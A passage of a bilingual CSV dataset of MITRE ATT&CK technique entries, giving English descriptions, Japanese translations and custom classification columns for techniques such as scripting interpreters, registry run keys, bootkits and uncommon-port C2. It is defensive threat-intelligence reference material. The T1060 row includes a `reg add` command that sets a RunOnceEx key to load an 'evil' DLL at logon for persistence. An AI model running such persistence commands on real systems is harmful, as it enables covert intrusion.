execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.",攻撃者はクラウド API を悪用して悪意のあるコマンドを実行する可能性があります。 クラウド環境で利用可能なAPIは様々な機能を提供し、テナントのほぼすべての側面へのプログラムによるアクセスを可能にする機能豊富な方法です。これらのAPIは、コマンドラインインタプリタ（CLI）、ブラウザ内クラウドシェル、[PowerShell](https://attack.mitre.org/techniques/T1059/001)モジュール（Azure for PowerShellなど）（引用元: Microsoft - Azure PowerShell）、あるいは[Python](https://attack.mitre.org/techniques/T1059/006)などの言語向けに提供されるソフトウェア開発キット（SDK）など、様々な方法で利用可能です。クラウドAPIの機能により、コンピューティング、ストレージ、アイデンティティとアクセス管理（IAM）、ネットワーク、セキュリティポリシーなど、テナント内の主要なサービス全体にわたる管理アクセスが可能になる場合があります。 適切な権限（多くの場合、[アプリケーションアクセストークン](https://attack.mitre.org/techniques/T1550/001) や [Web セッション Cookie](https://attack.mitre.org/techniques/T1550/004) などの認証情報の使用による）があれば、攻撃者はクラウド API を悪用して、悪意のあるアクションを実行するさまざまな機能を呼び出す可能性があります。 たとえば、CLI や PowerShell の機能は、クラウドホストまたはオンプレミスホストにインストールされたバイナリから、あるいは多くのクラウドプラットフォーム（AWS、Azure、GCP など）が提供するブラウザベースのクラウドシェルからアクセスできます。これらのクラウドシェルは、多くの場合、クラウド環境でコンテナとしてホストされる CLI および/またはスクリプトモジュールを使用するための、パッケージ化された統合環境です。,execution,IaaS;SaaS;Office Suite;Identity Provider,credential_abuse,foothold,authentication_system;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Identity / SaaS (IdP/SSO);Management Console for GovCloud,subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--55bb4471-ff1f-43b4-88c1-c9384ec47abf,2022-03-17T13:28:24.989Z,2025-04-15T19:58:32.612Z,,,,
T1059.010,T1059,AutoHotKey & AutoIT,AutoHotKey および AutoIT,"Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.(Citation: AutoIT)(Citation: AutoHotKey) Adversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as [Phishing](https://attack.mitre.org/techniques/T1566) payloads.(Citation: Splunk DarkGate) These scripts may also be compiled into self-contained executable payloads (`.exe`).(Citation: AutoIT)(Citation: AutoHotKey)",攻撃者はAutoITおよびAutoHotKey自動化スクリプトを使用してコマンドを実行し、悪意のあるタスクを実行する可能性があります。AutoITとAutoHotkey（AHK）は、ユーザーがWindowsタスクを自動化できるスクリプト言語です。これらの自動化スクリプトは、ボタンのクリック、テキスト入力、プログラムの起動・終了など、多様な操作を実行するために利用されます。(引用: AutoIT)(引用: AutoHotKey) 攻撃者はAHK（`.ahk`）およびAutoIT（`.au3`）スクリプトを悪用し、被害者システム上で悪意のあるコードを実行する可能性があります。例えば、攻撃者はAHKを用いてペイロードやキーロガーなどのモジュール型マルウェアを実行した事例があります。 攻撃者はまた、埋め込まれたマルウェアを含むカスタムAHKファイルを[フィッシング](https://attack.mitre.org/techniques/T1566)ペイロードとして使用しています。(引用: Splunk DarkGate) これらのスクリプトは、自己完結型の実行可能ペイロード（`.exe`）にコンパイルされることもあります。(引用: AutoIT)(引用: AutoHotKey),execution,Windows,script_command_execution,foothold,user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--3a32740a-11b0-4bcf-b0a9-3abd0f6d3cd5,2024-03-29T18:07:04.743Z,2025-04-15T19:58:23.600Z,,,,
T1059.011,T1059,Lua,Lua,"Adversaries may abuse Lua commands and scripts for execution. Lua is a cross-platform scripting and programming language primarily designed for embedded use in applications. Lua can be executed on the command-line (through the stand-alone lua interpreter), via scripts (<code>.lua</code>), or from Lua-embedded programs (through the <code>struct lua_State</code>).(Citation: Lua main page)(Citation: Lua state) Lua scripts may be executed by adversaries for malicious purposes. Adversaries may incorporate, abuse, or replace existing Lua interpreters to allow for malicious Lua command execution at runtime.(Citation: PoetRat Lua)(Citation: Lua Proofpoint Sunseed)(Citation: Cyphort EvilBunny)(Citation: Kaspersky Lua)",攻撃者はLuaコマンドやスクリプトを悪用して実行を行う可能性があります。Luaは主にアプリケーションへの組み込み利用を目的としたクロスプラットフォームのスクリプト言語/プログラミング言語です。Luaはコマンドライン（スタンドアロンのluaインタプリタ経由）、スクリプト（<code>.lua</code>）、またはLua組み込みプログラム（<code>struct lua_State</code>経由）から実行可能です。（引用元： Luaメインページ)(引用: Lua状態) 悪意のある目的でLuaスクリプトが実行される可能性があります。攻撃者は既存のLuaインタプリタを組み込み、悪用、または置き換えることで、実行時に悪意のあるLuaコマンドの実行を可能にします。(引用: PoetRat Lua)(引用: Lua Proofpoint Sunseed)(引用: Cyphort EvilBunny)(引用: Kaspersky Lua),execution,Linux;macOS;Windows;Network Devices,script_command_execution,foothold,endpoint_execution,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--afddee82-3385-4682-ad90-eeced33f2d07,2024-08-05T18:19:42.201Z,2025-04-15T19:58:57.854Z,,,,
T1059.012,T1059,Hypervisor CLI,ハイパーバイザーCLI,"Adversaries may abuse hypervisor command line interpreters (CLIs) to execute malicious commands. Hypervisor CLIs typically enable a wide variety of functionality for managing both the hypervisor itself and the guest virtual machines it hosts. For example, on ESXi systems, tools such as `esxcli` and `vim-cmd` allow administrators to configure firewall rules and log forwarding on the hypervisor, list virtual machines, start and stop virtual machines, and more.(Citation: Broadcom ESXCLI Reference)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: LOLESXi) Adversaries may be able to leverage these tools in order to support further actions, such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).",攻撃者はハイパーバイザーのコマンドラインインタプリタ（CLI）を悪用し、悪意のあるコマンドを実行する可能性があります。ハイパーバイザーCLIは通常、ハイパーバイザー自体とホストするゲスト仮想マシンの両方を管理するための多様な機能を提供します。 例えばESXiシステムでは、`esxcli`や`vim-cmd`などのツールにより、管理者はハイパーバイザー上のファイアウォールルールやログ転送の設定、仮想マシンの一覧表示、起動・停止などを実行できる。(引用: Broadcom ESXCLI Reference)(引用: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(引用元: LOLESXi) 攻撃者はこれらのツールを悪用し、[ファイルとディレクトリの発見](https://attack.mitre.org/techniques/T1083) や [影響を与えるためのデータ暗号化](https://attack.mitre.org/techniques/T1486) といったさらなる行動を支援できる可能性があります。,execution,ESXi,script_command_execution,foothold,privileged_account;endpoint_execution;file_storage_access;logging_monitoring,specified,Log / Monitoring Server,subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--d2d642da-61ff-4211-b4df-7923c9ca220c,2025-03-26T20:01:13.412Z,2025-04-15T21:24:59.280Z,,,,
T1060,,Registry Run Keys / Startup Folder,レジストリ実行キー / スタートアップフォルダ,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level. Placing a program within a startup folder will cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is: * <code>C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> The startup folder path for all users is: * <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code> The following run keys are created by default on Windows systems: * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""</code> (Citation: Oddvar Moe RunOnceEx Mar 2018) The following Registry keys can be used to set startup folder items for persistence: * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code> The following Registry keys can control automatic startup of services during boot: * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code> Using policy settings to specify startup programs creates corresponding values in either of two Registry keys: * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> and <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> subkeys can automatically launch programs. Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run when any user logs on. By default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot. Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.","攻撃者は、プログラムをスタートアップフォルダに追加するか、レジストリの実行キーで参照することで永続化を達成する可能性があります。レジストリの「実行キー」またはスタートアップフォルダにエントリを追加すると、ユーザーがログインした際に参照されたプログラムが実行されます。 (引用元: Microsoft Run Key) これらのプログラムはユーザーのコンテキストで実行され、アカウントに関連付けられた権限レベルを持ちます。プログラムをスタートアップフォルダ内に配置すると、ユーザーがログインした際にそのプログラムが実行されます。個々のユーザーアカウント用のスタートアップフォルダと、どのユーザーアカウントがログインしてもチェックされるシステム全体のスタートアップフォルダが存在します。 現在のユーザーのスタートアップフォルダパス: * <code>C:\Users\[ユーザー名]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> 全ユーザーのスタートアップフォルダパス: * <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code> Windowsシステムではデフォルトで以下の実行キーが作成されます: * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code> <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> も利用可能ですが、Windows Vista 以降ではデフォルトでは作成されません。レジストリの実行キーエントリは、プログラムを直接参照するか、依存関係としてリストできます。 (引用元: Microsoft RunOnceEx 2018年4月) 例えば、RunOnceEx の「Depend」キーを使用してログオン時に DLL をロードすることが可能です: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""</code> (引用元: Oddvar Moe RunOnceEx Mar 2018) 以下のレジストリキーを使用して、永続化のためのスタートアップフォルダ項目を設定できます: * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code> * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code> 以下のレジストリキーは、起動時のサービスの自動起動を制御できます: * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>ポリシー設定を使用して起動プログラムを指定すると、次のいずれかのレジストリキーに対応する値が作成されます: * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code> Winlogonキーは、Windows 7を実行するコンピューターにユーザーがログオンした際に発生する操作を制御します。 これらの動作のほとんどはオペレーティングシステムによって制御されますが、ここにカスタムアクションを追加することも可能です。<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> および <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> サブキーはプログラムを自動的に起動できます。 レジストリキー <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> のロード値にリストされているプログラムは、ユーザーがログオンすると実行されます。 デフォルトでは、レジストリキー <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> のマルチストリング値 BootExecute は autocheck autochk * に設定されています。この値により、システムが異常終了した場合、Windows は起動時にハードディスクのファイルシステム整合性をチェックします。 攻撃者は、このレジストリ値に他のプログラムやプロセスを追加し、起動時に自動的に実行させることができます。攻撃者はこれらの設定場所を利用して、リモートアクセスツールなどのマルウェアを実行し、システムの再起動後も永続性を維持できます。攻撃者はまた、[偽装](https://attack.mitre.org/techniques/T1036)を使用して、レジストリエントリが正当なプログラムに関連付けられているように見せかけることもあります。",persistence,Windows,credential_abuse,foothold,authentication_system;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--9422fc14-1c43-410d-ab0f-a709b76c72dc,2017-05-31T21:30:49.988Z,2025-04-25T15:15:53.310Z,,,,
T1061,,Graphical User Interface,グラフィカルユーザーインターフェース,"**This technique has been deprecated. Please use [Remote Services](https://attack.mitre.org/techniques/T1021) where appropriate.** The Graphical User Interfaces (GUI) is a common way to interact with an operating system. Adversaries may use a system's GUI during an operation, commonly through a remote interactive session such as [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076), instead of through a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), to search for information and execute files via mouse double-click events, the Windows Run command (Citation: Wikipedia Run Command), or other potentially difficult to monitor interactions.",**この手法は非推奨です。適切な場合には[リモートサービス](https://attack.mitre.org/techniques/T1021)を使用してください。**グラフィカルユーザーインターフェイス（GUI）は、オペレーティングシステムと対話する一般的な方法です。 攻撃者は、操作中にシステムのGUIを利用することがあり、一般的に[リモートデスクトッププロトコル](https://attack.mitre.org/techniques/T1076)などのリモート対話セッションを通じて行われ、 [コマンドとスクリプトインタプリタ](https://attack.mitre.org/techniques/T1059) ではなく、マウスのダブルクリックイベント、Windows の「ファイル名を指定して実行」コマンド（出典: Wikipedia Run Command）、または監視が困難なその他の操作を介して情報を検索し、ファイルを実行する可能性があります。,execution,Linux;macOS;Windows,credential_abuse,foothold,authentication_system;user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),deprecated;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--a6525aec-acc4-47fe-92f9-b9b4de4b9228,2017-05-31T21:30:50.342Z,2025-04-25T15:15:57.623Z,,,,
T1062,,Hypervisor,ハイパーバイザー,**This technique has been deprecated and should no longer be used.** A type-1 hypervisor is a software layer that sits between the guest operating systems and system's hardware. (Citation: Wikipedia Hypervisor) It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen. (Citation: Wikipedia Xen) A type-1 hypervisor operates at a level below the operating system and could be designed with [Rootkit](https://attack.mitre.org/techniques/T1014) functionality to hide its existence from the guest operating system. (Citation: Myers 2007) A malicious hypervisor of this nature could be used to persist on systems through interruption.,**この手法は非推奨となり、使用すべきではありません。** タイプ1ハイパーバイザーは、ゲストOSとシステムハードウェアの間に位置するソフトウェア層です（出典: Wikipedia ハイパーバイザー）。OSに対して仮想実行環境を提供します。一般的なハイパーバイザーの例としてXenがあります。 (出典: Wikipedia Xen) タイプ1ハイパーバイザーはオペレーティングシステムの下位レベルで動作し、ゲストOSからその存在を隠蔽する[ルートキット](https://attack.mitre.org/techniques/T1014)機能を備えた設計が可能です。(出典: Myers 2007) この種の悪意あるハイパーバイザーは、中断処理を通じてシステム上に永続化するために利用される可能性があります。,persistence,Windows,other,foothold,privileged_account,specified,Business Workstation;Server (On-Prem/VM),deprecated;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--4be89c7c-ace6-4876-9377-c8d54cef3d63,2017-05-31T21:30:50.958Z,2025-04-25T15:15:30.122Z,,,,
T1063,,Security Software Discovery,セキュリティソフトウェアの検出,"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1063) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. ### Windows Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. ### Mac It's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.",攻撃者は、システムにインストールされているセキュリティソフトウェア、設定、防御ツール、センサーの一覧を取得しようとする可能性があります。これにはローカルファイアウォールルールやアンチウイルスなどが含まれます。 攻撃者は自動検出時の[セキュリティソフトウェアの発見](https://attack.mitre.org/techniques/T1063)から得た情報を基に、ターゲットへの完全な感染の可否や特定アクションの試行を含む、後続行動を決定する可能性がある。 ### Windows セキュリティソフトウェア情報を取得するために使用できるコマンド例としては、[netsh](https://attack.mitre.org/software/S0108)、[Reg](https://attack.mitre.org/software/S0075) を使用した <code>reg query</code>、 <code>dir</code>（[cmd](https://attack.mitre.org/software/S0106) 経由）、[Tasklist](https://attack.mitre.org/software/S0057) などがありますが、探査行動の他の指標は、攻撃者が探しているソフトウェアやセキュリティシステムの種類により特化したものとなる場合があります。 ### Mac macOS マルウェアが LittleSnitch や KnockKnock ソフトウェアのチェックを行うケースが増えています。,discovery,macOS;Windows,script_command_execution,situational_awareness,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--241814ae-de3f-4656-b49e-f9a80764d4b7,2017-05-31T21:30:51.330Z,2025-04-25T15:15:16.682Z,,,,
T1064,,Scripting,スクリプティング,"**This technique has been deprecated. Please use [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) where appropriate.** Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts. Scripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them. Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)",**この手法は非推奨です。適切な場合には[コマンドとスクリプティングインタプリタ](https://attack.mitre.org/techniques/T1059)をご利用ください。**攻撃者は、手動で行う必要のある複数の操作を支援するためにスクリプトを使用することがあります。スクリプティングは、運用タスクの高速化や重要リソースへのアクセス獲得に必要な時間の短縮に有用です。 一部のスクリプト言語は、他のプログラムを呼び出す代わりにAPIレベルでOSと直接やり取りすることで、プロセス監視メカニズムを迂回するために使用される可能性があります。Windows向けの一般的なスクリプト言語にはVBScriptや[PowerShell](https://attack.mitre.org/techniques/T1086)がありますが、コマンドラインバッチスクリプトの形式をとる場合もあります。 スクリプトはOffice文書内にマクロとして埋め込み可能であり、[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1193)やその他のスピアフィッシング攻撃で使用されるファイルが開かれた際に実行されるように設定できる。 悪意のある埋め込みマクロは、[クライアント実行のためのエクスプロイト](https://attack.mitre.org/techniques/T1203)によるソフトウェア悪用とは異なる実行手段であり、攻撃者はマクロが許可されていること、またはユーザーがマクロの実行を承諾することを前提とします。セキュリティテスターと攻撃者の双方に利用されるスクリプティング手法を採用した攻撃フレームワークは数多く存在します。 Metasploit（引用元: Metasploit_Ref）、Veil（引用元: Veil_Ref）、PowerSploit（引用元: Powersploit）は、侵入テスト担当者間でエクスプロイトおよび侵害後の操作に広く利用される3つの例であり、防御回避のための多くの機能を備えています。一部の攻撃者がPowerShellを使用していることも知られています（引用元: Alperovitch 2014）。,defense-evasion;execution,Linux;macOS;Windows,script_command_execution,stealth,user_interaction;endpoint_execution;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),deprecated;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0005;TA0002,attack-pattern--7fd87010-3a00-4da3-b905-410525e8ec44,2017-05-31T21:30:51.733Z,2025-04-25T15:15:48.264Z,,,,
T1065,,Uncommonly Used Port,非標準ポートの使用,Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.,攻撃者は、不適切に設定されたプロキシやファイアウォールを迂回するため、非標準ポートを介したC2通信を行う可能性がある。,command-and-control,Linux;macOS;Windows,c2_communication,remote_control,,unknown,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--c848fcf7-6b62-4bde-8216-b6c157d48da0,2017-05-31T21:30:53.408Z,2025-04-25T15:16:08.535Z,,,,
T1066,,Indicator Removal from Tools,ツールからの指標除去,"If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems. A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",悪意のあるツールが検知され隔離または制限された場合、攻撃者は検知原因（インジケーター）を特定し、ツールからインジケーターを除去して改変し、更新版を再利用することが可能となる。これにより標的の防御システムや同様のシステムを採用する次期標的から検知されなくなる。 その好例が、ファイル署名によってマルウェアが検出され、アンチウイルスソフトウェアによって隔離された場合である。マルウェアがファイル署名のために隔離されたと判断できる攻撃者は、[ソフトウェアのパッキング](https://attack.mitre.org/techniques/T1045) などを使用してファイルを変更し、別の署名を持たせた上で、そのマルウェアを再利用することができる。,defense-evasion,Linux;macOS;Windows,other,stealth,file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6,2017-05-31T21:30:54.176Z,2025-04-25T15:15:04.223Z,,,,
T1067,,Bootkit,ブートキット,"A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016) Adversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly. ### Master Boot Record The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011) ### Volume Boot Record The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",ブートキットは、ハードドライブのブートセクタ（マスターブートレコード（MBR）やボリュームブートレコード（VBR）を含む）を改変するマルウェアの一種である。（出典：MTrends 2016）攻撃者はブートキットを用いて、オペレーティングシステムの下位レイヤでシステムへの永続化を図る場合があり、組織が使用を疑い適切な対応を取らない限り、完全な修復が困難となる可能性がある。 ### マスターブートレコード MBRは、BIOSによるハードウェア初期化完了後に最初に読み込まれるディスク領域である。ブートローダーが配置される場所である。ブートドライブへの直接アクセス権を持つ攻撃者は、この領域を上書きし、起動時の実行を通常のブートローダーから攻撃者コードへ転送させることが可能である。 (引用: Lau 2011)### ボリュームブートレコード MBRは起動プロセスの制御をVBRに引き渡します。MBRの場合と同様に、ブートドライブへの直接アクセス権を持つ攻撃者はVBRを上書きし、起動時の実行を攻撃者コードへ転送することが可能です。,persistence,Linux;Windows,other,foothold,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--02fefddc-fb1b-423f-a76b-7552dd211d4d,2017-05-31T21:30:54.661Z,2025-04-25T15:15:04.909Z,,,,
T1068,,Exploitation for Privilege Escalation,特権昇格のための悪用,"Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions. When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods. Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool 